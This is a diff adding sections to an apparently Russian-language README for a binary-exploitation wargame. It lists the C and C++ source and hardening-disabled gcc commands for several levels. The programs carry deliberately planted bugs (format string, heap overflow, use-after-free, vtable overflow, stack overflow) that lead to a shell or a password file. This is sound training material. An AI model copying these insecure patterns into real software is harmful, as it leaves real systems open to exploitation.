+
+    fgets(b, sizeof(b), stdin);
+    printf(b);
+    exit(1);   
+
+}
+
+int main(int argc, char **argv) {
+
+    n();
+
+}
+
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
+</details> 
+
 #
 ###### [вернуться к содержанию](#content)
 <a name="lvl6"></a> 
 # level6
+
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdlib.h"
+#include "unistd.h"
+#include "string.h"
+#include "stdio.h"
+#include "sys/types.h"
+
+#define FILE_PASS "/bin/cat /home/user/level7/.pass"
+
+struct data {
+
+    char name[64];
+
+};
+
+struct fp {
+
+    int (*fp)();
+
+};
+
+void n (void) {
+
+    system(FILE_PASS);
+
+}
+
+void m(void) {
+
+    printf("Nope\n");
+
+}
+
+int main(int argc, char **argv) {
+
+    struct data *d;
+    struct fp *f;
+
+    d = malloc(sizeof(struct data));
+    f = malloc(sizeof(struct fp));
+    f->fp = m;
+    strcpy(d->name, argv[1]);
+    f->fp();
+
+}
+
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
+</details> 
 
 #
 ###### [вернуться к содержанию](#content)
 <a name="lvl7"></a> 
 # level7
 
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdlib.h"
+#include "unistd.h"
+#include "string.h"
+#include "stdio.h"
+#include "sys/types.h"
+#include "sys/stat.h"
+#include "fcntl.h"
+
+char c[80];
+
+struct internet {
+
+    int priority;
+    char *name;
+
+};
+
+void m(void) {
+
+    printf("%s - %d\n", c, time(NULL));
+
+}
+
+int main(int argc, char **argv) {
+
+    struct internet *i1, *i2, *i3;
+
+    i1 = malloc(sizeof(struct internet));
+    i1->priority = 1;
+    i1->name = malloc(8);
+
+    i2 = malloc(sizeof(struct internet));
+    i2->priority = 2;
+    i2->name = malloc(8);
+
+    strcpy(i1->name, argv[1]);
+    strcpy(i2->name, argv[2]);
+    fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
+
+    printf("~~\n");
+    return (0);
+
+}
+
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
+</details> 
+
 #
 ###### [вернуться к содержанию](#content)
 <a name="lvl8"></a> 
 # level8
+
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdlib.h"
+#include "unistd.h"
+#include "string.h"
+#include "sys/types.h"
+#include "stdio.h"
+
+struct auth {
+
+    char name[32];
+    int auth;
+
+};
+
+struct auth *auth;
+char        *service;
+
+int main(int argc, char **argv) {
+
+    char  line[128];
+
+    while(42) {
+
+        printf("%p, %p \n", auth, service);
+
+        if(fgets(line, sizeof(line), stdin) == NULL) break;
+
+        if(strncmp(line, "auth ", 5) == 0) {
+
+                auth = malloc(sizeof(auth));
+                memset(auth, 0, sizeof(auth));
+                if(strlen(line + 5) < 31) {
+
+                        strcpy(auth->name, line + 5);
+
+                }
+
+        }
+
+        if(strncmp(line, "reset", 5) == 0) {
+
+                free(auth);
+
+        }
+
+        if(strncmp(line, "service", 6) == 0) {
+
+                service = strdup(line + 7);
+
+        }
+
+        if(strncmp(line, "login", 5) == 0) {
+
+                if(auth->auth) {
+
+                        system("/bin/sh");
+
+                } else {
+
+                        fprintf(stdout, "Password:\n");
+
+                }
+
+        }
+
+    }
+
+    return 0;
+
+}
+
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
+</details> 
 
 #
 ###### [вернуться к содержанию](#content)
 <a name="lvl9"></a> 
 # level9
 
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "iostream"
+#include "cstring"
+ 
+class N {
+
+public:
+
+    N(int x) : number(x) {}
+    void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
+    virtual int operator+(N &r) {return number + r.number;}
+    virtual int operator-(N &r) {return number - r.number;}
+
+private:
+
+    char annotation[100];
+    int number;
+
+};
+ 
+int main(int argc, char **argv)
+{
+
+    if(argc < 2) _exit(1);
+ 
+    N *x = new N(5);
+    N *y = new N(6);
+    N &five = *x, &six = *y;
+ 
+    five.setAnnotation(argv[1]);
+ 
+    return six + five;
+
+}
+
+</pre>
+g++ -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
+</details> 
+
 #
 ###### [вернуться к содержанию](#content)
 <a name="bonus0"></a> 
 # bonus0
+
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdio.h"
+#include "string.h"
+ 
+void  p(char *name, char *msg){
+
+  char buf[4096];
+ 
+  puts(msg);
+  read(0, buf, sizeof buf);
+  *strchr(buf, '\n') = 0;
+  strncpy(name, buf, 20);
+
+}
+ 
+void  pp(char *fullname) {
+
+  char last[20];
+  char first[20];
+ 
+  p(first, " - ");
+  p(last, " - ");
+ 
+  strcpy(fullname, first);
+  strcat(fullname, " ");
+  strcat(fullname, last);
+
+}
+ 
+int main(int argc, char **argv){
+
+  char fullname[42];
+ 
+  pp(fullname);
+  printf("%s\n", fullname);
+  return 0;
+
+}
+
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector  исходник_level.c -o level
+</details> 
 
 #
 ###### [вернуться к содержанию](#content)
 <a name="bonus1"></a> 
 # bonus1
 
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdio.h"
+#include "string.h"
+#include "unistd.h"
+ 
+int main(int argc, char **argv)
+{
+
+    int count = atoi(argv[1]);
+    int buf[10];
+  
+    if(count >= 10 ) return 1;
+  
+    memcpy(buf, argv[2], count * sizeof(int));
+    if(count == 0x574f4c46) {
+
+      execl("/bin/sh", "sh" ,NULL);
+
+    }
+    return 0;
+
+}
+
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
+</details> 
+
 #
 ###### [вернуться к содержанию](#content)
 <a name="bonus2"></a> 
 # bonus2
 
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdio.h"
+#include "stdlib.h"
+#include "string.h"
+
+enum{
+
+    EN,
+    FN,
+    NL,
+
+};
+
+int language = EN;
+
+struct UserRecord{
+
+    char name[40];
+    char password[32];
+    int id;
+
+};
+
+void    greetuser(struct UserRecord user){
+
+    char greeting[64];
+    switch(language){
+
+        case EN:
+                strcpy(greeting, "Hello "); break;
+        case FN:
+                strcpy(greeting, "Hyvää päivää "); break;
+        case NL:
+                strcpy(greeting, "Goedemiddag! "); break;
+
+    }
+
+    strcat(greeting, user.name);
+    printf("%s\n", greeting);
+
+}
+
+int   main(int argc, char **argv, char **env){
+
+    if(argc != 3) {
+
+        return 1;
+
+    }
+
+    struct UserRecord user = {0};
+    strncpy(user.name, argv[1], sizeof(user.name));
+    strncpy(user.password, argv[2], sizeof(user.password));
+
+    char *envlang = getenv("LANG");
+    if(envlang)
+
+            if(!memcmp(envlang, "fi", 2))
+
+                    language = FN;
+
+            else if(!memcmp(envlang, "nl", 2))
+
+                    language = NL;
+
+    greetuser(user);
+
+}
+
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
+</details> 
+
 #
 ###### [вернуться к содержанию](#content)
 <a name="bonus3"></a> 
 # bonus3
+
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdio.h"
+#include "stdlib.h"
+#include "string.h"
+#include "unistd.h"
+
+#define FILE_PASS "/home/user/end/.pass"
+
+int main(int argc, char **argv){
+
+    FILE *fp = fopen(FILE_PASS, "r");
+    struct {char pass[66], msg_err[66]} pwfile = {{0}};
+    char ptr[0];
+
+    if(!fp || argc != 2)
+
+            return -1;
+
+    fread(pwfile.pass, 1, 66, fp);
+    pwfile.pass[65] = 0;
+    ptr[atoi(argv[1])] = 0;
+    fread(pwfile.msg_err, 1, 65, fp);
+    fclose(fp);
+
+    if(!strcmp(pwfile.pass, argv[1]))
+
+            execl("/bin/sh", "sh", 0);
+
+    else
+
+            puts(pwfile.msg_err);
+
+    return 0;
+
+}
+
+</pre>
+gcc -m32 -fno-stack-protector -Wl,-z,norelro исходник_level.c -o level
+</details> 
+
+
+
+Уязвимость Use-After-Free
+https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/
